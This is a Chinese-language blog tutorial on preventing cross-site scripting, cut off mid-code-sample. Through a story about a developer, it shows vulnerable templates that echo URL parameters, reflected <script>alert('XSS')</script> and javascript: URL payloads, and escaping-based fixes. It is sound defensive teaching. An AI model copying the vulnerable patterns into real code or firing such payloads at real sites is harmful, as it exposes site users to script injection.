<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>如何防止XSS攻击？ | Smile ^o^</title>
    <meta name="description" content="记录日常工作、学习的知识">
    <link rel="icon" href="/blog/img/彩虹.png">
  <meta name="theme-color" content="#3eaf7c">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
    
    <link rel="preload" href="/blog/assets/css/0.styles.00fe1ddf.css" as="style"><link rel="preload" href="/blog/assets/js/app.691678be.js" as="script"><link rel="preload" href="/blog/assets/js/2.ba034f29.js" as="script"><link rel="preload" href="/blog/assets/js/87.93ed8a37.js" as="script"><link rel="prefetch" href="/blog/assets/js/10.632bd915.js"><link rel="prefetch" href="/blog/assets/js/11.772f967c.js"><link rel="prefetch" href="/blog/assets/js/12.ff26e0aa.js"><link rel="prefetch" href="/blog/assets/js/13.1b8f9604.js"><link rel="prefetch" href="/blog/assets/js/14.9a7df919.js"><link rel="prefetch" href="/blog/assets/js/15.4d6a21fd.js"><link rel="prefetch" href="/blog/assets/js/16.666db653.js"><link rel="prefetch" href="/blog/assets/js/17.a797cfe4.js"><link rel="prefetch" href="/blog/assets/js/18.a045528b.js"><link rel="prefetch" href="/blog/assets/js/19.095e5a15.js"><link rel="prefetch" href="/blog/assets/js/20.0c5e41ec.js"><link rel="prefetch" href="/blog/assets/js/21.10c1c22c.js"><link rel="prefetch" href="/blog/assets/js/22.3d274259.js"><link rel="prefetch" href="/blog/assets/js/23.e9ce92b2.js"><link rel="prefetch" href="/blog/assets/js/24.c97a23b6.js"><link rel="prefetch" href="/blog/assets/js/25.1e14926e.js"><link rel="prefetch" href="/blog/assets/js/26.752bade9.js"><link rel="prefetch" href="/blog/assets/js/27.dc5a3e6b.js"><link rel="prefetch" href="/blog/assets/js/28.9d7929bc.js"><link rel="prefetch" href="/blog/assets/js/29.8bcca565.js"><link rel="prefetch" href="/blog/assets/js/3.a37b7841.js"><link rel="prefetch" href="/blog/assets/js/30.5d40f78a.js"><link rel="prefetch" href="/blog/assets/js/31.a7862089.js"><link rel="prefetch" href="/blog/assets/js/32.9ab020d3.js"><link rel="prefetch" href="/blog/assets/js/33.61af89c7.js"><link rel="prefetch" href="/blog/assets/js/34.ef67e138.js"><link rel="prefetch" href="/blog/assets/js/35.b8b72ed5.js"><link rel="prefetch" href="/blog/assets/js/36.ae5b409a.js"><link rel="prefetch" href="/blog/assets/js/37.e618ee46.js"><link rel="prefetch" href="/blog/assets/js/38.04806802.js"><link rel="prefetch" href="/blog/assets/js/39.8d9b9563.js"><link rel="prefetch" href="/blog/assets/js/4.0d191ff1.js"><link rel="prefetch" href="/blog/assets/js/40.04518f3a.js"><link rel="prefetch" href="/blog/assets/js/41.6bf1718b.js"><link rel="prefetch" href="/blog/assets/js/42.a3dfedee.js"><link rel="prefetch" href="/blog/assets/js/43.a8d95aa2.js"><link rel="prefetch" href="/blog/assets/js/44.3a12c49e.js"><link rel="prefetch" href="/blog/assets/js/45.d5d98979.js"><link rel="prefetch" href="/blog/assets/js/46.234ac3a9.js"><link rel="prefetch" href="/blog/assets/js/47.33679be5.js"><link rel="prefetch" href="/blog/assets/js/48.91dd4a4d.js"><link rel="prefetch" href="/blog/assets/js/49.278c8abb.js"><link rel="prefetch" href="/blog/assets/js/5.9b1c580e.js"><link rel="prefetch" href="/blog/assets/js/50.acb96b49.js"><link rel="prefetch" href="/blog/assets/js/51.32188c4f.js"><link rel="prefetch" href="/blog/assets/js/52.ec8a6f44.js"><link rel="prefetch" href="/blog/assets/js/53.440af944.js"><link rel="prefetch" href="/blog/assets/js/54.85b002c5.js"><link rel="prefetch" href="/blog/assets/js/55.714cdb2c.js"><link rel="prefetch" href="/blog/assets/js/56.5a19f6c9.js"><link rel="prefetch" href="/blog/assets/js/57.03e1b8a3.js"><link rel="prefetch" href="/blog/assets/js/58.640f7bb7.js"><link rel="prefetch" href="/blog/assets/js/59.04ab8dd2.js"><link rel="prefetch" href="/blog/assets/js/6.b37cc082.js"><link rel="prefetch" href="/blog/assets/js/60.51243e5b.js"><link rel="prefetch" href="/blog/assets/js/61.869879d3.js"><link rel="prefetch" href="/blog/assets/js/62.19e9997a.js"><link rel="prefetch" href="/blog/assets/js/63.fa0d4e9e.js"><link rel="prefetch" href="/blog/assets/js/64.dcbb7569.js"><link rel="prefetch" href="/blog/assets/js/65.b0aee567.js"><link rel="prefetch" href="/blog/assets/js/66.c2239c63.js"><link rel="prefetch" href="/blog/assets/js/67.52c784b8.js"><link rel="prefetch" href="/blog/assets/js/68.39a7efed.js"><link rel="prefetch" href="/blog/assets/js/69.37845d77.js"><link rel="prefetch" href="/blog/assets/js/7.b1a72256.js"><link rel="prefetch" href="/blog/assets/js/70.eefd97a9.js"><link rel="prefetch" href="/blog/assets/js/71.ccd32287.js"><link rel="prefetch" href="/blog/assets/js/72.118662a5.js"><link rel="prefetch" href="/blog/assets/js/73.9d654570.js"><link rel="prefetch" href="/blog/assets/js/74.abbd1d57.js"><link rel="prefetch" href="/blog/assets/js/75.db0ef567.js"><link rel="prefetch" href="/blog/assets/js/76.2165a22a.js"><link rel="prefetch" href="/blog/assets/js/77.4ad54d5b.js"><link rel="prefetch" href="/blog/assets/js/78.53f09210.js"><link rel="prefetch" href="/blog/assets/js/79.6ebfbc85.js"><link rel="prefetch" href="/blog/assets/js/8.357c92c0.js"><link rel="prefetch" href="/blog/assets/js/80.78ce848e.js"><link rel="prefetch" href="/blog/assets/js/81.f420c368.js"><link rel="prefetch" href="/blog/assets/js/82.7c9a721b.js"><link rel="prefetch" href="/blog/assets/js/83.794915fc.js"><link rel="prefetch" href="/blog/assets/js/84.6a53c0fe.js"><link rel="prefetch" href="/blog/assets/js/85.2effe18f.js"><link rel="prefetch" href="/blog/assets/js/86.6a8b7025.js"><link rel="prefetch" href="/blog/assets/js/88.e446a59e.js"><link rel="prefetch" href="/blog/assets/js/9.b2e3f63a.js">
    <link rel="stylesheet" href="/blog/assets/css/0.styles.00fe1ddf.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/blog/" class="home-link router-link-active"><img src="/blog/img/晴朗.png" alt="Smile ^o^" class="logo"> <span class="site-name can-hide">Smile ^o^</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="自学" class="dropdown-title"><span class="title">自学</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/blog/guide/sourceCode/1.html" class="nav-link">框架源码相关内容</a></li><li class="dropdown-item"><!----> <a href="/blog/guide/stylesCode/3.html" class="nav-link">样式相关内容</a></li><li class="dropdown-item"><!----> <a href="/blog/guide/weixinCode/1.html" class="nav-link">小程序</a></li><li class="dropdown-item"><!----> <a href="/blog/guide/nodeCode/1.html" class="nav-link">Node</a></li><li class="dropdown-item"><!----> <a href="/blog/guide/jsCommonCode/1.html" class="nav-link">JS专题</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="工作" class="dropdown-title"><span class="title">工作</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/blog/config/sourceCode/1.html" class="nav-link">webpack相关内容</a></li><li class="dropdown-item"><!----> <a href="/blog/config/stylesCode/1.html" class="nav-link">样式相关内容</a></li><li class="dropdown-item"><!----> <a href="/blog/config/jsCode/1.html" class="nav-link">其他</a></li><li class="dropdown-item"><!----> <a href="/blog/config/errorCode/1.html" class="nav-link">问题</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="语言" class="dropdown-title"><span class="title">语言</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/blog/language/English/1.html" class="nav-link">英语相关内容</a></li><li class="dropdown-item"><!----> <a href="/blog/language/Japanese/1.html" class="nav-link">日语相关内容</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="其他" class="dropdown-title"><span class="title">其他</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/blog/other/network/1.html" class="nav-link router-link-exact-active router-link-active">网络相关内容</a></li><li class="dropdown-item"><!----> <a href="/blog/other/algorithm/1.html" class="nav-link">算法相关内容</a></li></ul></div></div><div class="nav-item"><a href="https://github.com/He-Shanshan/blog.git" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="自学" class="dropdown-title"><span class="title">自学</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/blog/guide/sourceCode/1.html" class="nav-link">框架源码相关内容</a></li><li class="dropdown-item"><!----> <a href="/blog/guide/stylesCode/3.html" class="nav-link">样式相关内容</a></li><li class="dropdown-item"><!----> <a href="/blog/guide/weixinCode/1.html" class="nav-link">小程序</a></li><li class="dropdown-item"><!----> <a href="/blog/guide/nodeCode/1.html" class="nav-link">Node</a></li><li class="dropdown-item"><!----> <a href="/blog/guide/jsCommonCode/1.html" class="nav-link">JS专题</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="工作" class="dropdown-title"><span class="title">工作</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/blog/config/sourceCode/1.html" class="nav-link">webpack相关内容</a></li><li class="dropdown-item"><!----> <a href="/blog/config/stylesCode/1.html" class="nav-link">样式相关内容</a></li><li class="dropdown-item"><!----> <a href="/blog/config/jsCode/1.html" class="nav-link">其他</a></li><li class="dropdown-item"><!----> <a href="/blog/config/errorCode/1.html" class="nav-link">问题</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="语言" class="dropdown-title"><span class="title">语言</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/blog/language/English/1.html" class="nav-link">英语相关内容</a></li><li class="dropdown-item"><!----> <a href="/blog/language/Japanese/1.html" class="nav-link">日语相关内容</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="其他" class="dropdown-title"><span class="title">其他</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/blog/other/network/1.html" class="nav-link router-link-exact-active router-link-active">网络相关内容</a></li><li class="dropdown-item"><!----> <a href="/blog/other/algorithm/1.html" class="nav-link">算法相关内容</a></li></ul></div></div><div class="nav-item"><a href="https://github.com/He-Shanshan/blog.git" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>网络安全相关</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/blog/other/network/1.html" class="active sidebar-link">如何防止XSS攻击？</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#背景" class="sidebar-link">背景</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#前端安全" class="sidebar-link">前端安全</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#xss攻击的介绍" class="sidebar-link">XSS攻击的介绍</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#xss-漏洞的发生和修复" class="sidebar-link">XSS 漏洞的发生和修复</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#漏洞总结" class="sidebar-link">漏洞总结</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#xss攻击的分类" class="sidebar-link">XSS攻击的分类</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#什么是-xss" class="sidebar-link">什么是 XSS</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#xss-分类" class="sidebar-link">XSS 分类</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#xss攻击的预防" class="sidebar-link">XSS攻击的预防</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#预防-dom-型-xss-攻击" class="sidebar-link">预防 DOM 型 XSS 攻击</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#其他xss防范措施" class="sidebar-link">其他XSS防范措施</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#xss的检测" class="sidebar-link">XSS的检测</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#xss攻击的总结" class="sidebar-link">XSS攻击的总结</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#xss攻击案例" class="sidebar-link">XSS攻击案例</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#xss攻击扩展阅读：automatic-context-aware-escaping" class="sidebar-link">XSS攻击扩展阅读：Automatic Context-Aware Escaping</a></li><li class="sidebar-sub-header"><a href="/blog/other/network/1.html#网络攻击未完待续" class="sidebar-link">网络攻击未完待续</a></li></ul></li></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="如何防止xss攻击？"><a href="#如何防止xss攻击？" class="header-anchor">#</a> 如何防止XSS攻击？</h1> <h2 id="背景"><a href="#背景" class="header-anchor">#</a> 背景</h2> <p>随着互联网的高速发展，信息安全问题已经成为企业最为关注的焦点之一，而前端又是引发企业安全问题的高危据点。在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。当然，浏览器自身也在不断在进化和发展，不断引入 CSP、Same-Site Cookies 等新技术来增强安全性，但是仍存在很多潜在的威胁，这需要前端技术人员不断进行“查漏补缺”。</p> <h2 id="前端安全"><a href="#前端安全" class="header-anchor">#</a> 前端安全</h2> <p>这次的内容主要是XSS攻击包括一下几部分  ：
1.XSS 攻击的介绍<br>
2.XSS 攻击的分类<br>
3.XSS 攻击的预防和检测<br>
4.XSS 攻击的总结<br>
5.XSS 攻击案例</p> <h3 id="xss攻击的介绍"><a href="#xss攻击的介绍" class="header-anchor">#</a> XSS攻击的介绍</h3> <p>在开始本文之前，我们先提出一个问题，请判断以下两个说法是否正确：</p> <p>XSS 防范是后端 RD （研发人员）的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。<br>
所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</p> <h3 id="xss-漏洞的发生和修复"><a href="#xss-漏洞的发生和修复" class="header-anchor">#</a> XSS 漏洞的发生和修复</h3> <p>XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。</p> <p>一个案例</p> <p>某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>&lt;%= getParameter(<span class="token punctuation">&quot;</span></span><span class="token attr-name">keyword&quot;)</span> <span class="token attr-name">%</span><span class="token punctuation">&gt;</span></span>&quot;&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">&gt;</span></span>搜索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
  您搜索的关键词是：&lt;%= getParameter(&quot;keyword&quot;) %&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>然而，在上线后不久，小明就接到了安全组发来的一个神秘链接：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code>http://xxx/search?keyword=&quot;&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>小明带着一种不祥的预感点开了这个链接[请勿模仿，确认安全的链接才能点开]。果然，页面中弹出了写着&quot;XSS&quot;的对话框。</p> <p>可恶，中招了！小明眉头一皱，发现了其中的奥秘：<br>
当浏览器请求 <code>http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</code> 时，服务端会解析出请求参数 keyword，得到 <code>&quot;&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</code>，拼接到 HTML 中返回给浏览器。形成了如下的 HTML：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>&quot;&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">&gt;</span></span>搜索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
  您搜索的关键词是：&quot;&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>浏览器无法分辨出 <code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code>是恶意代码，因而将其执行。</p> <p>这里不仅仅 div 的内容被注入了，而且 input 的 value 属性也被注入， alert 会弹出两次。</p> <p>面对这种情况，我们应该如何进行防范呢？</p> <p>其实，这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。</p> <p>聪明的小明很快找到解决方法，把这个漏洞修复：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>&lt;%= escapeHTML(getParameter(<span class="token punctuation">&quot;</span></span><span class="token attr-name">keyword&quot;))</span> <span class="token attr-name">%</span><span class="token punctuation">&gt;</span></span>&quot;&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">&gt;</span></span>搜索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
  您搜索的关键词是：&lt;%= escapeHTML(getParameter(&quot;keyword&quot;)) %&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>escapeHTML() 按照如下规则进行转义：
<a href="https://mmbiz.qpic.cn/mmbiz_png/hEx03cFgUsXw7kYHEwyuqDeZaFMIic8iaRiac9TOkGK99dLIogsMibfm2yUHw9nibKwAuv7XNVm6TZ2WPUaibnnFkynQ/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" target="_blank" rel="noopener noreferrer">转移规则<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>经过了转义函数的处理后，最终浏览器接收到的响应为：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span><span class="token entity" title="&quot;">&amp;quot;</span><span class="token entity" title="&gt;">&amp;gt;</span><span class="token entity" title="&lt;">&amp;lt;</span>script<span class="token entity" title="&gt;">&amp;gt;</span>alert(<span class="token entity" title="&amp;#x27;">&amp;#x27;</span>XSS<span class="token entity" title="&amp;#x27;">&amp;#x27;</span>);<span class="token entity" title="&lt;">&amp;lt;</span><span class="token entity" title="&amp;#x2F;">&amp;#x2F;</span>script<span class="token entity" title="&gt;">&amp;gt;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">&gt;</span></span>搜索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
  您搜索的关键词是：<span class="token entity" title="&quot;">&amp;quot;</span><span class="token entity" title="&gt;">&amp;gt;</span><span class="token entity" title="&lt;">&amp;lt;</span>script<span class="token entity" title="&gt;">&amp;gt;</span>alert(<span class="token entity" title="&amp;#x27;">&amp;#x27;</span>XSS<span class="token entity" title="&amp;#x27;">&amp;#x27;</span>);<span class="token entity" title="&lt;">&amp;lt;</span><span class="token entity" title="&amp;#x2F;">&amp;#x2F;</span>script<span class="token entity" title="&gt;">&amp;gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>恶意代码都被转义，不再被浏览器执行，而且搜索词能够完美的在页面显示出来。</p> <p>通过这个事件，小明学习到了如下知识：</p> <p>通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。<br>
攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。<br>
攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。<br>
通过 HTML 转义，可以防止 XSS 攻击。[事情当然没有这么简单啦！请继续往下看]。<br>
注意特殊的 HTML 属性、JavaScript API<br>
自从上次事件之后，小明会小心的把插入到页面中的数据进行转义。而且他还发现了大部分模板都带有的转义配置，让所有插入到页面中的数据都默认进行转义。这样就不怕不小心漏掉未转义的变量啦，于是小明的工作又渐渐变得轻松起来。</p> <p>不久，小明又收到安全组的神秘链接：<code>http://xxx/?redirect_to=javascript:alert('XSS')</code>。小明不敢大意，赶忙点开页面。然而，页面并没有自动弹出万恶的“XSS”。</p> <p>小明打开对应页面的源码，发现有以下内容：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>&lt;%= escapeHTML(getParameter(<span class="token punctuation">&quot;</span></span><span class="token attr-name">redirect_to&quot;))</span> <span class="token attr-name">%</span><span class="token punctuation">&gt;</span></span>&quot;&gt;跳转...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
这段代码，当攻击 URL 为 http://xxx/?redirect_to=javascript:alert('XSS')，服务端响应就成了：

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>javascript:alert(<span class="token entity" title="&amp;#x27;">&amp;#x27;</span>XSS<span class="token entity" title="&amp;#x27;">&amp;#x27;</span>)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>跳转...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>虽然代码不会立即执行，但一旦用户点击 a 标签时，浏览器会就会弹出alert('xss')。</p> <p>可恶，又失策了…<br>
在这里，用户的数据并没有在位置上突破我们的限制，仍然是正确的 href 属性。但其内容并不是我们所预期的类型。</p> <p>原来不仅仅是特殊字符，连 javascript: 这样的字符串如果出现在特定的位置也会引发 XSS 攻击。</p> <p>小明眉头一皱，想到了解决办法：</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// 禁止 URL 以 &quot;javascript:&quot; 开头</span>
xss <span class="token operator">=</span> <span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">&quot;redirect_to&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'javascript:'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>xss<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;&lt;%= escapeHTML(getParameter(&quot;</span>redirect_to<span class="token string">&quot;))%&gt;&quot;</span><span class="token operator">&gt;</span>
    跳转<span class="token operator">...</span>
